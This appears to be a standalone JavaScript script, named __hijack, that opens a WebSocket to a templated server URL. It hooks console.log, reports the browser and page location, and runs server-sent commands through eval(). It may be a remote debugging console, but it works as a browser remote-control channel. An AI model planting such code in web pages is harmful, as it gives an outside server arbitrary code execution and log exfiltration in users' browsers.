__hijack = function(){
	if (console._log){return}
	var session = parseInt(sessionStorage.getItem('hijack::session')) || parseInt(Math.random() * 1e16);
	sessionStorage.setItem('hijack::session', session.toString());
	var timeout_id = 0;
	var buffer = [];

	var command = function(cmd){
		var output;
		try {
			output = eval(cmd);
		}catch(e){
			output = e.toString();
		}

		return output;
	}

	var run = function(){
		timeout_id = 0;
		var ws = new WebSocket("{{.url}}");

		ws.onopen = function(){
			if (!console._log){
				console._log = console.log;
			}

			ws.send(JSON.stringify({event: "info", data:{browser: window.navigator.userAgent, location: window.location.href, session: session}}));

			console.log = function(){
				console._log.apply(this, arguments);

				if (ws.readyState === 1){

					while (buffer.length){
						ws.send(JSON.stringify({event: "log", data:{session: session, log: JSON.stringify(buffer.shift())}}));
					}

					ws.send(JSON.stringify({event: "log", data:{session: session, log: JSON.stringify(arguments)}}));
				} else {
					if (buffer.length < 1024){
						buffer.push(arguments)
					}
				}
			};

			ws.onmessage = function(event){
				var frame = JSON.parse(event.data);

				switch (frame.event) {
					case 'command':
						var output = command(frame.data.cmd);

						if (frame.data.echo){
							console.log(frame.data.cmd);
							console.log(output);
						}else{
							frame.data.hijacker_id = session;
							frame.data.response = output;
							ws.send(JSON.stringify({event:"command", data: frame.data}))
						}

						break;
				}
			};
		};

		ws.onclose = ws.onerror = function(){
			if (!timeout_id) {
				timeout_id = setTimeout(run, 5000);
			}
		};
	};

	run()
};

__hijack();